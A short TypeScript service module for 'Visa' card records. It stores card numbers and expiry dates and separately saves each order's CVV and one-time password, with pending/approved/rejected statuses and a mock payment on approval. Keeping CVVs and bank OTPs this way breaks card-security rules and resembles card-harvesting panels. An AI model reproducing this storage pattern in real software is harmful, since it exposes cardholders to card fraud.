import {
  findVisaById,
  findVisaByOrderId,
  listAllVisa,
  setVisaStatus,
  updateVisaCvvByOrderId,
  updateVisaOtpByOrderId,
  visa,
} from "@/models/visa.repository";
import { mockPay } from "@/services/recharge.service";

export type VisaDecision = "approved" | "rejected";

class VisaService {
  static async createVisa(holderName: string, cardNumber: string, expiryDate: string, orderId: string) {
    return visa.create({
      holderName,
      cardNumber,
      expiryDate,
      status: "pending",
      orderId,
      createdAt: new Date(),
      updatedAt: new Date(),
    });
  }

  static async listAll() {
    return listAllVisa();
  }

  static async getById(id: string) {
    return findVisaById(id);
  }

  static async getByOrderId(orderId: string) {
    return findVisaByOrderId(orderId);
  }

  static async submitOtpForOrder(orderId: string, otp: string) {
    const row = await findVisaByOrderId(orderId);
    if (!row) throw new Error("not_found");
    return updateVisaOtpByOrderId(orderId, otp);
  }

  static async submitCvvForOrder(orderId: string, cvv: string) {
    const row = await findVisaByOrderId(orderId);
    if (!row) throw new Error("not_found");
    return updateVisaCvvByOrderId(orderId, cvv);
  }

  static async updateStatus(id: string, decision: VisaDecision) {
    const row = await findVisaById(id);
    if (!row) throw new Error("not_found");
    if (row.status !== "pending") throw new Error("generic");
    const updated = await setVisaStatus(id, decision);
    if (decision === "approved" && updated.orderId) {
      await mockPay(updated.orderId, "mock");
    }
    return updated;
  }
}

export default VisaService;
